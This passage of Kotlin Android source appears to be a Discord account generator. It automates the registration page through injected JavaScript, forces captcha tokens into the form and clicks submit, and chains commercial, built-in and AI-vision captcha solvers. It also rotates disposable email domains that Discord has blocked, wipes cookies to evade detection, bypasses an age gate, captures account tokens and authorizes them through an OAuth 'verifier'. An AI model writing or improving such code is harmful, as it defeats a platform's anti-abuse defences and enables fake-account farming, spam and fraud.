                log("Auth Verifier already verified client_id=$cid", LogLevel.INFO)
                anyOk = true
                continue
            }
            try {
                var ok = false
                var lastErr: String? = null
                repeat(5) { attempt ->
                    if (ok) return@repeat
                    ok = VaultCordOAuth.authorize(clean, url) { msg ->
                        lastErr = msg
                        log("Auth Verifier: $msg", LogLevel.INFO)
                    }
                    if (!ok) delay(1000L * (attempt + 1))
                }
                if (ok) {
                    anyOk = true
                    if (cid.isNotBlank()) VaultCordVerifiedStore.markVerified(context, clean, cid)
                    log("✓ Auth Verifier OK${if (cid.isNotBlank()) " client_id=$cid" else ""}", LogLevel.SUCCESS)
                    // First success is enough — skip remaining OAuth links for this token
                    break
                } else {
                    log(
                        "Auth Verifier failed after retries${if (cid.isNotBlank()) " client_id=$cid" else ""}" +
                            (lastErr?.let { " — $it" } ?: "") +
                            " status=${VaultCordOAuth.lastStatus}",
                        LogLevel.WARNING
                    )
                }
            } catch (e: Exception) {
                log("Auth Verifier exception: ${e.message}", LogLevel.ERROR)
            }
        }
        if (!anyOk) {
            log("⚠ Auth Verifier: no OAuth link succeeded for this token", LogLevel.WARNING)
        }
    }


    /**
     * Loads the image at [uriStr], applies [fit] (cover/contain/fill), resizes to 256×256 PNG,
     * and returns the raw base64 string (no data-URI prefix).
     */
    @Suppress("DEPRECATION")
    private fun loadAndEncodeAvatar(uriStr: String, fit: String): String? {
        return try {
            val uri = android.net.Uri.parse(uriStr.trim())
            val resolver = context.contentResolver
            val src: android.graphics.Bitmap = when (uri.scheme?.lowercase()) {
                "content", "file", "android.resource" -> {
                    resolver.openInputStream(uri)?.use { stream ->
                        android.graphics.BitmapFactory.decodeStream(stream)
                    } ?: return null
                }
                "http", "https" -> {
                    // remote URL fallback
                    val bytes = java.net.URL(uri.toString()).openStream().use { it.readBytes() }
                    android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return null
                }
                else -> {
                    // try content resolver first, then MediaStore legacy
                    resolver.openInputStream(uri)?.use { stream ->
                        android.graphics.BitmapFactory.decodeStream(stream)
                    } ?: try {
                        @Suppress("DEPRECATION")
                        android.provider.MediaStore.Images.Media.getBitmap(resolver, uri)
                    } catch (_: Exception) { null }
                }
            } ?: return null
            val size = 256
            val out: android.graphics.Bitmap = when (fit) {
                "fill" -> android.graphics.Bitmap.createScaledBitmap(src, size, size, true)
                "contain" -> {
                    val dst = android.graphics.Bitmap.createBitmap(size, size, android.graphics.Bitmap.Config.ARGB_8888)
                    val canvas = android.graphics.Canvas(dst)
                    val scale = minOf(size.toFloat() / src.width, size.toFloat() / src.height)
                    val dx = (size - src.width * scale) / 2f
                    val dy = (size - src.height * scale) / 2f
                    val m = android.graphics.Matrix().apply { setScale(scale, scale); postTranslate(dx, dy) }
                    canvas.drawBitmap(src, m, android.graphics.Paint(android.graphics.Paint.FILTER_BITMAP_FLAG))
                    dst
                }
                else -> { // cover — center-crop to square
                    val scale = maxOf(size.toFloat() / src.width, size.toFloat() / src.height)
                    val sw = (src.width * scale).toInt()
                    val sh = (src.height * scale).toInt()
                    val scaled = android.graphics.Bitmap.createScaledBitmap(src, sw, sh, true)
                    android.graphics.Bitmap.createBitmap(scaled, (sw - size) / 2, (sh - size) / 2, size, size)
                }
            }
            val baos = java.io.ByteArrayOutputStream()
            out.compress(android.graphics.Bitmap.CompressFormat.JPEG, 100, baos)
            android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            null
        }
    }

    fun onBridgeTokenFound(token: String) {
        if (!running) return   // ignore JS bridge calls after stop()
        if (token.isNotEmpty()) {
            pendingToken = token
            if (TokenUtil.isValidTokenFormat(token)) {
                waitingForContinue = false
                captchaManualMode = false
            }
        }
    }

    fun onBridgeCaptchaDetected(siteKey: String) {
        if (captchaSolving) return
        captchaSolving = true
        // Un-black captcha widget if overlays hid the iframe
        try {
            listener.injectJs(
                """
                (function(){
                  document.querySelectorAll('iframe[src*="hcaptcha"],iframe[src*="newassets.hcaptcha"],iframe[src*="captcha"]').forEach(function(f){
                    try{
                      f.style.opacity='1'; f.style.visibility='visible'; f.style.display='block';
                      f.style.width=f.style.width||'100%'; f.style.minHeight='200px';
                      if(f.parentElement){ f.parentElement.style.opacity='1'; f.parentElement.style.visibility='visible'; }
                    }catch(e){}
                  });
                  document.querySelectorAll('[class*="captcha"],[id*="captcha"]').forEach(function(el){
                    try{ if(el.style && el.style.opacity==='0') el.style.opacity='1'; }catch(e){}
                  });
                  try{ Android.onLog('Captcha UI un-black applied','INFO'); }catch(e){}
                })();
                """.trimIndent()
            )
        } catch (_: Exception) {}
        generatorScope?.launch {
            try {
                // Gesture / AI Vision path — taps on WebView instead of token inject
                if (prefs.autoCaptchaEnabled && prefs.captchaSolveMode.equals("gesture", ignoreCase = true)) {
                    val wv = listener.getWebView()
                    if (wv == null) {
                        log("Gesture/AI mode needs WebView — none available", LogLevel.WARNING)
                    } else {
                        log("Gesture/AI captcha mode (${prefs.gestureSolverProvider})…", LogLevel.CAPTCHA)
                        val ok = GestureCaptchaSolver(log = { msg, lvl -> log(msg, lvl) }).solve(
                            webView = wv,
                            injectJs = { js -> listener.injectJs(js) },
                            provider = prefs.gestureSolverProvider,
                            visionApiUrl = prefs.gestureVisionApiUrl,
                            aiApiKey = prefs.aiVisionApiKey,
                            aiBaseUrl = prefs.aiVisionBaseUrl,
                            aiModel = prefs.aiVisionModel,
                            aiProvider = prefs.aiVisionProvider,
                            timeoutMs = (prefs.captchaTimeoutSeconds.coerceAtLeast(30) * 1000L)
                        )
                        if (ok) {
                            log("Gesture/AI solver finished — continuing…", LogLevel.SUCCESS)
                            lastCaptchaMethod = "Gesture/AI"
                            lastCaptchaSolverApi = prefs.gestureSolverProvider
                            delay(1200)
                            listener.injectJs("window.__captchaSubmittedExternally = true;")
                            captchaSolving = false
                            return@launch
                        } else {
                            log("Gesture/AI solver did not clear challenge — falling through", LogLevel.WARNING)
                        }
                    }
                }

                if (prefs.advancedInAppSolverEnabled) {
                    // ── Advanced In-App Solver (fully independent — no NopeCHA fallback) ──
                    log("⚡ Advanced In-App Solver: trying built-in solver (no API required)...", LogLevel.INFO)
                    val inAppSolution = builtInSolver.solve(siteKey) { msg -> log("[solver] $msg", LogLevel.INFO) }
                    if (inAppSolution != null) {
                        log("✓ Captcha solved by built-in solver", LogLevel.SUCCESS)
                        lastCaptchaMethod = "Automatic"
                        lastCaptchaSolverApi = "" // built-in has no API key
                        withContext(Dispatchers.Main) {
                            listener.onCaptchaSolved(inAppSolution)
                            listener.injectJs(buildCaptchaInjectJs(inAppSolution))
                            armAutoContinueAfterSolve()
                        }
                        return@launch
                    }
                    log("In-App Solver failed — trying AutoCaptcha providers…", LogLevel.WARNING)
                }
                val forceNopechaExt = prefs.captchaSolverProvider.equals("nopecha", true) &&
                    prefs.nopechaMode.equals("extension", true)
                if (prefs.autoCaptchaEnabled || forceNopechaExt) {
                    if (forceNopechaExt && !prefs.autoCaptchaEnabled) {
                        log("NopeCHA Extension mode forces AutoCaptcha path", LogLevel.INFO)
                    }
                    // ── AutoCaptcha — selected provider first, then priority chain (NoneCap etc.) ──
                    log("⚡ AutoCaptcha: captcha detected (sitekey: ${siteKey.take(8)}...) — trying solvers...", LogLevel.INFO)
                    var solvedToken: String? = null
                    var solvedApi = ""

                    val selected = prefs.captchaSolverProvider.ifBlank {
                        prefs.captchaSolverPriority.split(",").map { it.trim() }.firstOrNull() ?: "nonecap"
                    }.trim().lowercase()
                    val chain = prefs.captchaSolverPriority.split(",")
                        .map { it.trim().lowercase() }
                        .filter { it.isNotBlank() }
                    val priority = (listOf(selected) + chain + listOf("nonecap", "nopecha")).distinct()
                    log("Captcha provider order: ${priority.joinToString(" → ")}", LogLevel.INFO)
                    for (solver in priority) {
                        if (solvedToken != null) break
                        if (!ProviderHealth.isCaptchaAvailable(solver)) {
                            log("Skipping $solver (cooldown)", LogLevel.WARNING)
                            continue
                        }
                        when (solver) {
                            "9captcha", "ninecaptcha" -> {
                                if (prefs.nineCaptchaKey.isNotEmpty()) {
                                    log("Trying 9Captcha...", LogLevel.INFO)
                                    val t = NineCaptchaApi(prefs.nineCaptchaKey)
                                        .solveHcaptcha(siteKey, "https://discord.com/register")
                                    if (!t.isNullOrBlank()) {
                                        solvedToken = t
                                        solvedApi = "9Captcha"
                                    } else log("9Captcha failed, trying next solver...", LogLevel.WARNING)
                                }
                            }
                            "nonecap", "none" -> {
                                if (prefs.nonecapApiKey.isNotEmpty()) {
                                    log("Trying NoneCap (free credits)...", LogLevel.INFO)
                                    val t = NoneCapApi(prefs.nonecapApiKey)
                                        .solveHcaptcha(siteKey, "https://discord.com/register") { msg -> log(msg, LogLevel.INFO) }
                                    if (t != null) {
                                        solvedToken = t
                                        solvedApi = "NoneCap"
                                    } else log("NoneCap failed, trying next solver...", LogLevel.WARNING)
                                }
                            }
                            "nopecha" -> {
                                val mode = prefs.nopechaMode.lowercase()
                                if (mode == "extension") {
                                    log("NopeCHA Extension — using installed host + solvers...", LogLevel.INFO)
                                    // 1) If user still has a key, use native API (bypasses CSP; same as real extension backend)
                                    if (prefs.nopechaApiKey.isNotBlank()) {
                                        try {
                                            val t = NopechaApi(prefs.nopechaApiKey)
                                                .solveHcaptcha(siteKey, "https://discord.com/register") { msg -> log(msg, LogLevel.INFO) }
                                            if (t != null) {
                                                solvedToken = t
                                                solvedApi = "NopeCHA-Extension+API"
                                            }
                                        } catch (e: Exception) {
                                            log("NopeCHA API under extension mode: ${e.message}", LogLevel.WARNING)
                                        }
                                    }
                                    // 2) No token yet — built-in recognition path (no key)
                                    if (solvedToken.isNullOrBlank()) {
                                        try {
                                            val inApp = BuiltInCaptchaSolver().solve(siteKey) { msg -> log(msg, LogLevel.INFO) }
                                            if (!inApp.isNullOrBlank()) {
                                                solvedToken = inApp
                                                solvedApi = "NopeCHA-Extension"
                                            }
                                        } catch (e: Exception) {
                                            log("Extension built-in: ${e.message}", LogLevel.WARNING)
                                        }
                                    }
                                    if (solvedToken.isNullOrBlank()) {
                                        log("NopeCHA Extension could not solve — next provider / manual", LogLevel.WARNING)
                                    }
                                } else if (prefs.nopechaApiKey.isNotEmpty()) {
                                    log("Trying NopeCHA API...", LogLevel.INFO)
                                    val t = NopechaApi(prefs.nopechaApiKey)
                                        .solveHcaptcha(siteKey, "https://discord.com/register") { msg -> log(msg, LogLevel.INFO) }
                                    if (t != null) { solvedToken = t; solvedApi = "NopeCHA" }
                                    else log("NopeCHA API failed, trying next solver...", LogLevel.WARNING)
                                } else {
                                    log("NopeCHA API key empty — set key or switch to Extension mode", LogLevel.WARNING)
                                }
                            }
                            "2captcha" -> {
                                if (prefs.captcha2Key.isNotEmpty()) {
                                    log("Trying 2Captcha...", LogLevel.INFO)
                                    val t = TwoCaptchaApi(prefs.captcha2Key)
                                        .solveHcaptcha(siteKey, "https://discord.com/register") { msg -> log(msg, LogLevel.INFO) }
                                    if (t != null) { solvedToken = t; solvedApi = "2Captcha" }
                                    else log("2Captcha failed, trying next solver...", LogLevel.WARNING)
                                }
                            }
                            "capsolver" -> {
                                if (prefs.capsolverKey.isNotEmpty()) {
                                    log("Trying CapSolver...", LogLevel.INFO)
                                    val t = CapSolverApi(prefs.capsolverKey)
                                        .solveHcaptcha(siteKey, "https://discord.com/register") { msg -> log(msg, LogLevel.INFO) }
                                    if (t != null) { solvedToken = t; solvedApi = "CapSolver" }
                                    else log("CapSolver failed, trying next solver...", LogLevel.WARNING)
                                }
                            }
                            "capmonster" -> {
                                if (prefs.capmonsterKey.isNotEmpty()) {
                                    log("Trying CapMonster...", LogLevel.INFO)
                                    val t = CapMonsterApi(prefs.capmonsterKey)
                                        .solveHcaptcha(siteKey, "https://discord.com/register") { msg -> log(msg, LogLevel.INFO) }
                                    if (t != null) { solvedToken = t; solvedApi = "CapMonster" }
                                    else log("CapMonster failed, trying next solver...", LogLevel.WARNING)
                                }
                            }
                            "az", "azcaptcha" -> {
                                if (prefs.azcaptchaKey.isNotEmpty()) {
                                    log("Trying AZCaptcha...", LogLevel.INFO)
                                    val t = AZCaptchaApi(prefs.azcaptchaKey)
                                        .solveHcaptcha(siteKey, "https://discord.com/register") { msg -> log(msg, LogLevel.INFO) }
                                    if (t != null) { solvedToken = t; solvedApi = "AZCaptcha" }
                                    else log("AZCaptcha failed, trying next solver...", LogLevel.WARNING)
                                }
                            }
                        }
                    }

                    if (solvedToken != null) {
                        try { ProviderHealth.markCaptchaOk(solvedApi) } catch (_: Exception) {}
                        log("✓ Captcha solved by $solvedApi (token len=${solvedToken.length})", LogLevel.SUCCESS)
                        lastCaptchaMethod = "Automatic"
                        lastCaptchaSolverApi = solvedApi
                        withContext(Dispatchers.Main) {
                            listener.onCaptchaSolved(solvedToken)
                            listener.injectJs(buildCaptchaInjectJs(solvedToken))
                            if (forceNopechaExt || prefs.nopechaMode.equals("extension", true)) {
                                listener.injectJs(
                                    "try{window.__evsExtSolve&&window.__evsExtSolve(" +
                                        org.json.JSONObject.quote(solvedToken) +
                                    ");}catch(e){}"
                                )
                            }
                            armAutoContinueAfterSolve()
                        }
                        // Delayed full re-inject if captcha iframe still present (Discord often ignores first inject)
                        delay(1800)
                        if (running) {
                            withContext(Dispatchers.Main) {
                                listener.injectJs(
                                    """
                                    (function(){
                                      var still = !!document.querySelector('iframe[src*="hcaptcha"],iframe[src*="newassets.hcaptcha"]');
                                      if (still) {
                                        window.__captchaInjectLock = false;
                                        Android.onLog('Captcha still visible — full re-inject', 'INFO');
                                      } else {
                                        Android.onLog('Captcha widget gone / page moved on', 'SUCCESS');
                                      }
                                    })();
                                    """.trimIndent()
                                )
                            }
                            delay(200)
                            withContext(Dispatchers.Main) {
                                // Clear lock and re-apply the same solved token
                                listener.injectJs("window.__captchaInjectLock=false;")
                                listener.injectJs(buildCaptchaInjectJs(solvedToken))
                                armAutoContinueAfterSolve()
                            }
                            delay(if (FeatureFlags.SPEED_EXPERIMENTS) 700 else 1500)
                            if (running) {
                                withContext(Dispatchers.Main) {
                                    listener.injectJs(buildCaptchaInjectJs(solvedToken))
                                }
                            }
                        }
                    } else {
                        try {
                            DeveloperTelemetry.reportCaptchaHardFail(
                                context,
                                siteKeyPrefix = siteKey.take(12),
                                tried = priority.joinToString(",")
                            )
                        } catch (_: Exception) {}
                        enterManualCaptchaMode("All auto-solvers failed — solve the captcha manually")
                    }
                    return@launch
                } else {
                    enterManualCaptchaMode("AutoCaptcha disabled")
                }
            } finally {
                // Wait for the user to actually continue before re-arming captcha detection.
                // Use NonCancellable so this cleanup always runs even if the coroutine is cancelled.
                withContext(NonCancellable) {
                    var waited = 0L
                    while (waitingForContinue && waited < 600_000L && running) {
                        delay(300)
                        waited += 300
                    }
                    delay(2_000)
                    captchaSolving = false
                    captchaManualMode = false
                }
            }
        }
    }

    /**
     * Called right after an auto-solver (built-in or NopeCHA) injects a captcha token
     * and clicks submit once. Arms the same watcher used in manual mode so that any
     * follow-up step Discord shows (verify-by-email prompt, a lingering Continue/Next
     * button, or landing on channels/@me) is detected and auto-clicked/auto-resumed
     * without requiring the user to tap CONTINUE. Must be called on the Main dispatcher.
     */
    private fun armAutoContinueAfterSolve() {
        listener.injectJs("window.__captchaSubmittedExternally = true; window.__captchaClickDone = false;")
        listener.injectJs(CAPTCHA_WATCH_JS)
        // Force Discord to accept token + click Create Account / Continue once
        listener.injectJs(
            """
(function(){
  function forceSubmit() {
    var token = window.__lastInjectedCaptchaToken;
    if (token) {
      document.querySelectorAll('[name="h-captcha-response"],textarea[name="h-captcha-response"]').forEach(function(el){
        try {
          var d = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value');
          if (d && d.set) d.set.call(el, token); else el.value = token;
          el.dispatchEvent(new Event('input',{bubbles:true}));
          el.dispatchEvent(new Event('change',{bubbles:true}));
        } catch(e) {}
      });
      try {
        document.querySelectorAll('[data-callback]').forEach(function(w){
          var cb = w.getAttribute('data-callback');
          if (cb && typeof window[cb]==='function') window[cb](token);
        });
      } catch(e) {}
    }
    var labels = ['create account','continue','agree','next','submit','verify','register'];
    var nodes = document.querySelectorAll('button, div[role="button"], [type="submit"]');
    for (var i=0;i<nodes.length;i++) {
      var n = nodes[i];
      var t = ((n.innerText||n.textContent||'')+' '+(n.getAttribute('aria-label')||'')).toLowerCase().replace(/\s+/g,' ').trim();
      if (!t || t.length > 48) continue;
      for (var k=0;k<labels.length;k++) {
        if (t === labels[k] || t.indexOf(labels[k]) === 0) {
          try { n.removeAttribute('disabled'); n.disabled = false; } catch(e) {}
          try { n.click(); Android.onLog('Force-clicked: '+t, 'SUCCESS'); return true; } catch(e) {}
        }
      }
    }
    // Try form requestSubmit
    var form = document.querySelector('form');
    if (form && form.requestSubmit) { try { form.requestSubmit(); Android.onLog('Form requestSubmit()', 'SUCCESS'); return true; } catch(e) {} }
    return false;
  }
  setTimeout(forceSubmit, 600);
  setTimeout(function(){ if (!window.__captchaClickDone) forceSubmit(); }, 1800);
})();
            """.trimIndent()
        )
    }

    /** Enters manual captcha mode: logs a clear prompt, sets flags, injects the login watcher. */
    private suspend fun enterManualCaptchaMode(reason: String) {
        captchaManualMode = true
        lastCaptchaMethod = "Manual"
        lastCaptchaSolverApi = ""
        lastStuckCheck = System.currentTimeMillis()   // reset timer so stuck check won't fire
        waitingForContinue = true
        log("⚠ $reason — solve the captcha in the WebView, then press CONTINUE", LogLevel.CAPTCHA, showContinue = true)
        listener.onStuck("Please solve the captcha, then tap CONTINUE.")
        withContext(Dispatchers.Main) { listener.injectJs(CAPTCHA_WATCH_JS) }
    }

    fun onContinuePressed() {
        // Fallback only. Never fight an already-captured login or mid email/phone flow.
        waitingForContinue = false
        lastStuckCheck = System.currentTimeMillis()
        if (pendingToken.isNotEmpty() && TokenUtil.isValidTokenFormat(pendingToken)) {
            captchaManualMode = false
            log("✓ Token already present — continuing", LogLevel.SUCCESS)
            try { listener.onAutoResumed() } catch (_: Exception) {}
            return
        }
        // Early-saved after login means we already past the login gate
        if (earlySavedAccountId != 0L) {
            captchaManualMode = false
            log("✓ Account already logged in — continuing verification steps", LogLevel.SUCCESS)
            try { listener.onAutoResumed() } catch (_: Exception) {}
            return
        }
        // Email / phone verification pages are NOT "not logged in"
        if (pendingEmailStatus in listOf("PENDING", "VERIFYING") || pendingPhoneRequest) {
            captchaManualMode = false
            log("✓ Continuing verification step…", LogLevel.INFO)
            try { listener.onAutoResumed() } catch (_: Exception) {}
            return
        }
        generatorScope?.launch {
            withContext(Dispatchers.Main) {
                listener.injectJs("window.__captchaReported = false; window.__rlWatching = false; window.__captchaWatchActive = false;")
                listener.injectJs(SMART_CONTINUE_JS)
                listener.injectJs(CAPTCHA_WATCH_JS)
            }
            var waited = 0L
            while (running && waited < 15_000L) {
                if (pendingToken.isNotEmpty() && TokenUtil.isValidTokenFormat(pendingToken)) {
                    captchaManualMode = false
                    waitingForContinue = false
                    log("✓ Login detected — continuing", LogLevel.SUCCESS)
                    try { listener.onAutoResumed() } catch (_: Exception) {}
                    return@launch
                }
                if (earlySavedAccountId != 0L) {
                    captchaManualMode = false
                    waitingForContinue = false
                    try { listener.onAutoResumed() } catch (_: Exception) {}
                    return@launch
                }
                delay(400)
                waited += 400
            }
            if (running && (pendingToken.isEmpty() || !TokenUtil.isValidTokenFormat(pendingToken)) && earlySavedAccountId == 0L) {
                if (!waitingForContinue) {
                    waitingForContinue = true
                    captchaManualMode = true
                    log("Waiting on page — finish the step, then CONTINUE (fallback only)", LogLevel.CAPTCHA, showContinue = true)
                    listener.onStuck("Finish the current step, then tap CONTINUE.")
                }
            } else {
                captchaManualMode = false
            }
        }
    }

    fun onBridgeCaptchaAutoSolved() {
        // Called by JS when it detects navigation to channels/@me while in manual mode.
        // Only treat as real resume if we have a token or the native loop will pick it up.
        waitingForContinue = false
        captchaManualMode = false
        lastStuckCheck = System.currentTimeMillis()
        if (pendingToken.isNotEmpty() && TokenUtil.isValidTokenFormat(pendingToken)) {
            log("✓ Auto-detected login after captcha — resuming", LogLevel.SUCCESS)
        } else {
            log("✓ Login page detected after captcha — waiting for token…", LogLevel.SUCCESS)
        }
        listener.onAutoResumed()
    }

    fun onBridgeEmailRejected() {
        onBridgeEmailRejectedReason("unknown")
    }

    fun onBridgeEmailRejectedReason(reason: String) {
        if (!running) return
        emailRejected = true
        emailRejectReason = reason.ifBlank { "unknown" }
        val msg = when (emailRejectReason) {
            "already_registered", "in_use" ->
                "Email already registered / in use — trying a different address (domain kept)"
            "domain_blocked", "domain_not_allowed" ->
                "Email domain blocked by Discord — blacklisting domain and retrying"
            "invalid" ->
                "Email marked invalid — trying a different address"
            else ->
                "Discord rejected this email — continuing with a different address"
        }
        log(msg, LogLevel.WARNING)
    }

    fun onBridgeUsernameRejected() {
        if (!running) return
        if (captchaSolving || captchaManualMode) {
            log("Username error ignored — captcha in progress", LogLevel.INFO)
            return
        }
        // Debounce: Discord/JS can fire the same error multiple times in one tick
        val now = System.currentTimeMillis()
        if (now - lastUsernameRetryMs < 2500L) return
        lastUsernameRetryMs = now

        generatorScope?.launch {
            usernameRetryCount++
            val attempt = (usernameRetryCount - 1).coerceAtLeast(0)
            currentUsername = if (prefs.randomUsernameEnabled) {
                val base = if (prefs.usernameSourceMode == "custom") {
                    prefs.usernamePrefix.trim().ifBlank { "User" }
                } else {
                    Humanizer.randomUsernameStem(context)
                }
                TokenUtil.nextUsernameVariant(base, attempt = attempt, allowUnderscore = true, avoid = usedUsernames)
            } else {
                TokenUtil.nextUsernameVariant("evsuser", attempt = attempt, allowUnderscore = true, avoid = usedUsernames)
            }
            usedUsernames += currentUsername
            log("Username taken — retry #$usernameRetryCount → $currentUsername", LogLevel.SUCCESS)
            // ONLY rewrite the username field — do NOT re-run full form fill
            // (that re-logs email / DOB / password and floods the console)
            withContext(Dispatchers.Main) {
                listener.injectJs(buildUsernameOnlyJs(currentUsername))
            }
        }
    }

    fun onBridgePasswordRejected() {
        if (!running) return
        if (captchaSolving || captchaManualMode) {
            log("Password error ignored — captcha in progress", LogLevel.INFO)
            return
        }
        val now = System.currentTimeMillis()
        if (now - lastPasswordRetryMs < 2500L) return
        lastPasswordRetryMs = now
        generatorScope?.launch {
            pendingPassword = if (prefs.customPasswordEnabled && prefs.customPassword.isNotBlank()) {
                val base = prefs.customPassword
                val variant = base + (10..99).random()
                if (variant.length in 8..72) variant else TokenUtil.generateSecurePassword(14)
            } else {
                TokenUtil.generateSecurePassword(14)
            }
            log("Password rejected — updated password field only", LogLevel.SUCCESS)
            withContext(Dispatchers.Main) {
                listener.injectJs(buildPasswordOnlyJs(pendingPassword))
            }
        }
    }

    fun onBridgeDisplayNameRejected() {
        if (!running) return
        if (captchaSolving || captchaManualMode) {
            log("Display name error ignored — captcha in progress", LogLevel.INFO)
            return
        }
        val now = System.currentTimeMillis()
        if (now - lastDisplayRetryMs < 2500L) return
        lastDisplayRetryMs = now
        generatorScope?.launch {
            currentDisplayName = if (prefs.randomDisplayNameEnabled && prefs.customDisplayName.isNotBlank()) {
                prefs.customDisplayName.trim() + (10..99).random()
            } else {
                listOf("Alex", "Sam", "Jordan", "Casey", "Riley", "Quinn").random() +
                    (10..99).random().toString()
            }
            log("Display name rejected — field updated: $currentDisplayName", LogLevel.SUCCESS)
            withContext(Dispatchers.Main) {
                listener.injectJs(buildDisplayNameOnlyJs(currentDisplayName))
            }
        }
    }

    fun onBridgeDobRejected() {
        if (!running) return
        // Soft signal only — age page uses onAgeRestrictionDetected for hard recover
        log("DOB field warning from page (no auto-wipe during captcha)", LogLevel.INFO)
    }

    /** JS detected Discord age-restriction / under-18 page after bad DOB. */
    fun onAgeRestrictionDetected() {
        if (!running) return
        generatorScope?.launch {
            log(
                "My bad — accidentally selected age below the 18 limit. Refreshing page with new cookie and continuing…",
                LogLevel.WARNING
            )
            try {
                DeveloperTelemetry.reportNote(
                    context,
                    title = "DOB_AGE_BLOCK",
                    detail = "Age restriction page after DOB; clearing session and retrying with minAge≥18"
                )
            } catch (_: Exception) {}
            recoverFromAgeBlock("age_restriction_page")
            // Reload register with fresh cookies and re-fill
            withContext(Dispatchers.Main) {
                try {
                    listener.clearWebViewData()
                } catch (_: Exception) {}
            }
            delay(1000)
            try {
                withContext(Dispatchers.Main) {
                    listener.navigateTo("https://discord.com/register")
                }
            } catch (_: Exception) {}
            delay(if (FeatureFlags.SPEED_EXPERIMENTS) 700 else 1500)
            // Main loop will re-fill via normal register path on next iteration
            log("Age block cleared — register reload requested; safer DOB (18+) will be used", LogLevel.INFO)
        }
    }

    fun onBridgeRegisterPageError() {
        // Disabled auto-reload: too easy to false-trigger and interrupt captcha/solve flow.
        if (!running) return
        log("Page error signal ignored (no auto-reload during registration)", LogLevel.INFO)
    }

    private suspend fun retryWithNewEmail() {
        if (retryingEmail) return
        retryingEmail = true
        try {
            val reason = emailRejectReason
            emailRejectReason = ""
            log("Discord rejected this email, fetching a new one... (reason=$reason)", LogLevel.WARNING)
            val oldDomain = pendingEmail.substringAfter('@', "")
            // "Already registered" must NOT blacklist — the address is taken, domain is fine.
            // Discord sometimes reports a blocked disposable provider as simply
            // "invalid email". Treat that as a domain rejection only when the
            // address came from a live provider domain; malformed custom addresses
            // still get retried without poisoning their domain.
            val explicitDomainBlock = reason in setOf("domain_blocked", "domain_not_allowed")
            val invalidProviderDomain = reason == "invalid" && pendingEmailDomainFromApi
            val shouldBlacklist = explicitDomainBlock || invalidProviderDomain || reason == "invalid"
            if (shouldBlacklist && oldDomain.isNotEmpty()) {
                excludeTempDomain(oldDomain)
                val why = if (explicitDomainBlock) "Discord reported a domain block" else
                    "Discord reported the provider address as invalid"
                log("Excluded blocked domain: @$oldDomain — $why", LogLevel.WARNING)
            } else if (oldDomain.isNotEmpty()) {
                val why = when (reason) {
                    "already_registered" -> "address already registered"
                    "invalid" -> "invalid address format"
                    else -> "provider did not report a domain block"
                }
                log("Keeping domain @$oldDomain — $why", LogLevel.INFO)
            }
            // Always drop the rejected address domain when invalid/blocked
            if (oldDomain.isNotBlank() && (
                shouldBlacklist || reason in setOf("invalid", "domain_blocked", "domain_not_allowed")
            )) {
                excludeTempDomain(oldDomain)
            }
            excludeTempDomain("uberip.com")

            var emailResult = createTempEmail(generateEmailLocalPart(), pendingPassword)
            var attempts = 1
            val rejected = prefs.rejectedMailDomains.split(',').map { it.trim().lowercase() }.filter { it.isNotEmpty() }.toSet() + HARD_BANNED_MAIL_DOMAINS
            // Prefer a *different domain* (not just a different local-part on same domain)
            while (
                attempts < 12 && (
                    emailResult.address.isBlank() ||
                    emailResult.domain.isBlank() ||
                    emailResult.domain.equals(oldDomain, ignoreCase = true) ||
                    emailResult.domain.lowercase() in rejected ||
                    emailResult.domain.lowercase() in HARD_BANNED_MAIL_DOMAINS
                )
            ) {
                log(
                    "Trying different domain/address (attempt $attempts)… last=@${emailResult.domain.ifBlank { "?" }}",
                    LogLevel.INFO
                )
                if (emailResult.domain.isNotBlank() &&
                    (emailResult.domain.equals(oldDomain, true) || emailResult.domain.lowercase() in HARD_BANNED_MAIL_DOMAINS)
                ) {
                    excludeTempDomain(emailResult.domain)
                }
                delay(400)
                emailResult = createTempEmail(generateEmailLocalPart(), pendingPassword)
                attempts++
            }
            if (emailResult.address.isBlank()) {
                log("✗ Could not obtain a usable email after $attempts tries — will retry next cycle", LogLevel.ERROR)
                // Soft recovery: reload register; main loop can create again on next account
                withContext(Dispatchers.Main) { listener.clearWebViewData() }
                delay(500)
                withContext(Dispatchers.Main) { listener.navigateTo("https://discord.com/register") }
                delay(if (FeatureFlags.SPEED_EXPERIMENTS) 700 else 1500)
                lastStuckCheck = System.currentTimeMillis()
                return
            }
            if (shouldBlacklist && emailResult.domain.equals(oldDomain, ignoreCase = true)) {
                log("⚠ Still same domain ${emailResult.domain} after $attempts tries — proceeding anyway", LogLevel.WARNING)
            }
            pendingEmail = emailResult.address
            pendingEmailDomainFromApi = emailResult.domainFromApi
            log("New email: $pendingEmail", LogLevel.SUCCESS)

            // Clear session and reload register page with fresh cookies so Discord
            // treats this as a brand new attempt.
            withContext(Dispatchers.Main) { listener.clearWebViewData() }
            delay(600)
            withContext(Dispatchers.Main) { listener.navigateTo("https://discord.com/register") }
            delay(if (FeatureFlags.SPEED_EXPERIMENTS) 900 else 2200)

            val fillJs = buildFillJs(pendingEmail, currentDisplayName, currentUsername, pendingPassword)
            withContext(Dispatchers.Main) { listener.injectJs(fillJs) }
            log("Retrying registration with fresh email and cookies", LogLevel.INFO)
            lastStuckCheck = System.currentTimeMillis()
        } finally {
            retryingEmail = false
        }
    }

    /**
     * Called by JS bridge when Discord shows "confirm your identity" page.
     * Polls CyberTemp inbox for the verification email, then loads the link in the WebView.
     * The main polling loop will naturally detect `channels/@me` and extract the token after.
     */
    fun onBridgeIdentityVerificationRequired() {
        if (identityVerificationHandled) return
        // If phone path already owns the gate, do not steal into email polling
        if (phoneVerificationHandled) {
            log("Identity signal ignored — phone verification already in progress", LogLevel.INFO)
            return
        }
        identityVerificationHandled = true
        // Block phone from starting until email identity finishes
        emailGateReleased = false
        log("🔐 Identity verification required — resend + poll inbox (provider=${activeEmailProvider()})...", LogLevel.WARNING)
        generatorScope?.launch {
            val tok = pendingToken.trim()
            if (tok.length >= 20) {
                resendVerificationEmail(tok) { msg -> log(msg, LogLevel.INFO) }
            }
            delay(1_500)
            var verifyUrl = pollVerificationUrl(
                emailAddr = pendingEmail,
                timeoutMs = 45_000L,
                onLog = { msg -> log(msg, LogLevel.INFO) }
            )
            if (verifyUrl == null && tok.length >= 20) {
                log("Identity: no link yet — second resend + longer poll...", LogLevel.INFO)
                resendVerificationEmail(tok) { msg -> log(msg, LogLevel.INFO) }
                delay(2_000)
